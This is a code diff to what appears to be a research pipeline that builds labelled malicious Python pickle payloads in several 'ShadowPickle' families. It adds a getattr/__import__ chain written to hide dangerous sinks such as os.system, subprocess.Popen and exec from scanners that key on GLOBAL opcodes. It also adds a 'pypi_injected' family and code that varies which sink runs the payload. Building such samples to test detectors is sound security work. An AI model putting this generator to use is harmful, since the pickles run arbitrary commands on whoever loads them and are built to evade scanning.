@@ -174,13 +174,14 @@ class IndirectChainTemplate(AttackTemplate):
 
     Instead of ``GLOBAL <dangerous-module> <sink>``, the stream evaluates::
 
-        __import__('<module>')            # benign global: builtins.__import__
-        getattr(<memoized module>, '<callable>')   # benign global: builtins.getattr
+        __import__('<module>', None, None, ['<callable>'])
+        getattr(<leaf module>, '<callable>')
 
-    then calls the resolved sink with the wrapped payload. No GLOBAL operand
-    ever names the dangerous pair, so scanners keying rules on the GLOBAL
-    import see only ``builtins.__import__`` / ``builtins.getattr``. The
-    import is nested inside the getattr argument region, keeping the stack
+    then calls the resolved sink with the wrapped payload. ``fromlist`` is
+    required so dotted modules resolve to the leaf, not the top-level package.
+    No GLOBAL operand ever names the dangerous pair, so scanners keying rules
+    on the GLOBAL import see only ``builtins.__import__`` / ``builtins.getattr``.
+    The import is nested inside the getattr argument region, keeping the stack
     balanced. Legacy py2 module aliases (``__builtin__``, ``copy_reg``) are
     normalized because ``__import__`` resolves names literally on py3.
     """
@@ -196,22 +197,13 @@ class IndirectChainTemplate(AttackTemplate):
 
     def generate_pickle_payload(self, payload_code: str) -> bytes:
         from pipeline.opcodes import OPCODES_BY_NAME
+        from pipeline.evasion import leaf_import_chain
 
         OP = OPCODES_BY_NAME
-        # Balanced getattr chain: __import__ nested inside the getattr args
-        # region (MARK..TUPLE), so no intermediate module ever stays on the
-        # stack. See pipeline.evasion.IndirectChain for the same pattern.
+        # Balanced getattr chain: __import__(mod, None, None, [name]) nested
+        # inside the getattr args region (MARK..TUPLE). See leaf_import_chain.
         parts: list[bytes] = [
-            OP["GLOBAL"].code + b"builtins\ngetattr\n",
-            OP["MARK"].code,
-            OP["GLOBAL"].code + b"builtins\n__import__\n",
-            pickle.dumps((self.module_name,), protocol=2)[2:-1],
-            OP["REDUCE"].code,
-            OP["SHORT_BINUNICODE"].code + bytes([len(self.callable_name)])
-            + self.callable_name.encode("utf-8"),
-            OP["TUPLE"].code,
-            OP["REDUCE"].code,
-            # sink(*args_for(payload))
+            *leaf_import_chain(self.module_name, self.callable_name),
             pickle.dumps(self._args_for(payload_code), protocol=2)[2:-1],
             OP["REDUCE"].code,
             OP["STOP"].code,
@@ -248,6 +240,7 @@ FAMILY_TEMPLATES: dict[str, AttackTemplate] = {
     "overwritten": OverwrittenModuleTemplate(),
     "external": ExternalModuleTemplate(),
     "indirect_chain": IndirectChainTemplate(),
+    "pypi_injected": PyPIInjectedTemplate(),
 }
 
 FAMILIES: tuple[str, ...] = ("gadget",) + tuple(FAMILY_TEMPLATES)
@@ -258,12 +251,90 @@ FAMILY_LABELS: dict[str, str] = {
     "overwritten": "shadowpickle_overwritten",
     "external": "shadowpickle_external",
     "indirect_chain": "shadowpickle_indirect_chain",
+    "pypi_injected": "shadowpickle_pypi_injected",
 }
 
 
 def family_template(family: str) -> AttackTemplate | None:
     """Return the template for a ShadowPickle family id, or None for 'gadget'."""
     return FAMILY_TEMPLATES.get(family)
+
+
+# Callable diversification for template families: allow the payload sink to be
+# sampled rather than hard-coding IPython.utils.process.system.  Only callables
+# whose sink_kind can carry the payload (system/exec/runstring) are allowed.
+TEMPLATE_FAMILY_SINKS: dict[str, list[tuple[str, str]]] = {
+    # pypi_injected and indirect_chain are system-sinks (shell command)
+    "pypi_injected": [
+        ("IPython.utils.process", "system"),
+        ("os", "system"),
+        ("posix", "system"),
+        ("subprocess", "Popen"),
+        ("subprocess", "run"),
+    ],
+    "external": [
+        ("numpy.testing._private.utils", "runstring"),
+        ("builtins", "exec"),
+    ],
+    "indirect_chain": [
+        ("os", "system"),
+        ("posix", "system"),
+        ("subprocess", "Popen"),
+        ("IPython.utils.process", "system"),
+    ],
+    "overwritten": [
+        ("collections", "OrderedDict"),
+        ("builtins", "exec"),
+    ],
+}
+
+
+def template_payload_for_callable(family: str, module: str, name: str,
+                                   payload_code: str) -> bytes:
+    """Generate a payload for a template family with an explicit callable.
+
+    Used for callable diversification of template families (peer-review
+    payload-level mutation).  Falls back to the family's default template when
+    the callable is not a known alternative.
+    """
+    # Check if this is a known alternative for the family
+    known = TEMPLATE_FAMILY_SINKS.get(family, [])
+    if (module, name) not in known and family in TEMPLATE_FAMILY_SINKS:
+        # Unknown alternative: try to infer sink_kind from registry
+        from pipeline.registry import get_entry
+        entry = get_entry(module, name)
+        # For templated families we only allow system/exec/runstring sinks
+        if entry is None:
+            return FAMILY_TEMPLATES[family].generate_pickle_payload(payload_code)
+    # Dispatch by sink shape
+    if family == "overwritten":
+        tmpl = OverwrittenModuleTemplate(module_name=module, class_name=name)
+        return tmpl.generate_pickle_payload(payload_code)
+    if family == "indirect_chain":
+        tmpl = IndirectChainTemplate(module_name=module, callable_name=name)
+        return tmpl.generate_pickle_payload(payload_code)
+    # pypi_injected / external: direct GLOBAL + args + REDUCE
+    tmpl = FAMILY_TEMPLATES.get(family)
+    if tmpl is not None:
+        # Build args consistent with the template's sink_kind
+        args = tmpl._args_for(payload_code)  # type: ignore[attr-defined]
+        # But if the alternative callable has different sink_kind, rebuild
+        # e.g. builtins.exec expects (code,) not (shell_cmd,)
+        if name in ("exec", "eval") or module == "builtins":
+            args = (payload_code,)
+        elif name == "runstring":
+            args = (payload_code, {})
+        elif name in ("Popen", "run", "call") and module == "subprocess":
+            import base64 as _b64
+            # Use same encoding as gadget to avoid quote issues
+            _enc = _b64.b64encode(payload_code.encode()).decode()
+            _cmd = f'python3 -c "import base64;exec(base64.b64decode({_enc!r}))"'
+            # system-like wrapper
+            args = (("python3", "-c", payload_code),) if name in ("Popen","run") else (payload_code,)
+            if name == "Popen":
+                args = (("python3", "-c", payload_code),)
+        return _generate_payload(module, name, args)
+    return FAMILY_TEMPLATES[family].generate_pickle_payload(payload_code)
 
 
 def _get_placeholder_class(module_name: str, class_name: str) -> type:
